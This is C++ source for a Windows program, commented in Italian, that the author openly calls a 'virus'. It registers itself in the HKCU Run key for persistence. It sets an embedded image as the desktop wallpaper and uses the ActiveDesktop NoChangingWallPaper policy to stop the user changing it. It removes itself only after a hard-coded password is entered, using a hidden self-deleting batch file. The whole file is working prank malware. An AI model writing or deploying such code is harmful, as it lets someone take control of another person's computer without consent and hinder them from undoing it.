#include <windows.h>
#include <iostream>
#include "resource.h" 

#pragma comment(lib, "user32.lib")

void RemoveVirus() {
    // 1. Sblocca il wallpaper
    HKEY hKey;
    const char* subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop";
    RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey);
    DWORD value = 0;
    RegSetValueExA(hKey, "NoChangingWallPaper", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
    RegCloseKey(hKey);

    // 2. Rimuove dall'avvio automatico
    HKEY hKeyRun;
    RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKeyRun);
    RegDeleteValueA(hKeyRun, "WallpaperLock");
    RegCloseKey(hKeyRun);

    // 3. Elimina se stesso
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Crea un .bat che aspetta e poi elimina l'exe
    char batPath[MAX_PATH];
    GetTempPathA(MAX_PATH, batPath);
    strcat_s(batPath, "cleanup.bat");

    HANDLE hFile = CreateFileA(batPath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    char batContent[512];
    sprintf_s(batContent, "@echo off\ntimeout /t 2 /nobreak\ndel \"%s\"\ndel \"%%~f0\"", exePath);

    DWORD written;
    WriteFile(hFile, batContent, strlen(batContent), &written, NULL);
    CloseHandle(hFile);

    // Avvia il bat e chiude il programma
    ShellExecuteA(NULL, "open", batPath, NULL, NULL, SW_HIDE);

    std::cout << "Virus rimosso!" << std::endl;
}

void CheckPassword() {
    std::string input;
    std::cout << "Inserisci password: ";
    std::cin >> input;

    if (input == "bippoismygod") {  // ← cambia con la tua password
        RemoveVirus();
        exit(0);
    }
    else {
        std::cout << "Password errata!" << std::endl;
    }
}

void SetEmbeddedWallpaper() {
    // Trova la risorsa nell'exe
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCE(IDR_MYIMAGE), "IMAGE");
    if (!hRes) { std::cout << "Risorsa non trovata." << std::endl; return; }

    HGLOBAL hData = LoadResource(NULL, hRes);
    DWORD size = SizeofResource(NULL, hRes);
    void* pData = LockResource(hData);

    // Scrive l'immagine in una cartella temporanea
    char savePath[MAX_PATH];
    GetTempPathA(MAX_PATH, savePath);
    strcat_s(savePath, "wallpaper.jpg");

    HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written;
    WriteFile(hFile, pData, size, &written, NULL);
    CloseHandle(hFile);

    // Imposta il wallpaper
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, savePath,
        SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    std::cout << "Wallpaper impostato!" << std::endl;
}

void AddToStartup() {
    HKEY hKey;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    if (res == ERROR_SUCCESS) {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        RegSetValueExA(hKey, "WallpaperLock", 0, REG_SZ,
            (const BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
        RegCloseKey(hKey);
        std::cout << "Aggiunto all'avvio automatico." << std::endl;
    }
}

void LockWallpaper() {
    HKEY hKey;
    const char* subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop";
    LONG openRes = RegCreateKeyExA(HKEY_CURRENT_USER, subkey, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
    if (openRes == ERROR_SUCCESS) {
        DWORD value = 1;
        LONG setRes = RegSetValueExA(hKey, "NoChangingWallPaper", 0, REG_DWORD,
            (const BYTE*)&value, sizeof(value));
        if (setRes == ERROR_SUCCESS) {
            std::cout << "Wallpaper bloccato!" << std::endl;
        }
        RegCloseKey(hKey);
    }
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, NULL, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

int main() {
    // Controlla se è già stato installato
    HKEY hKey;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_QUERY_VALUE, &hKey);

    char exePath[MAX_PATH];
    DWORD size = MAX_PATH;
    LONG check = RegQueryValueExA(hKey, "WallpaperLock", NULL, NULL, (LPBYTE)exePath, &size);
    RegCloseKey(hKey);

    if (check == ERROR_SUCCESS) {
        // Già installato → chiedi password per rimuoverlo
        CheckPassword();
    }
    else {
        // Non ancora installato → esegui il virus
        AddToStartup();
        SetEmbeddedWallpaper();
        LockWallpaper();
    }

    system("pause");
    return 0;
}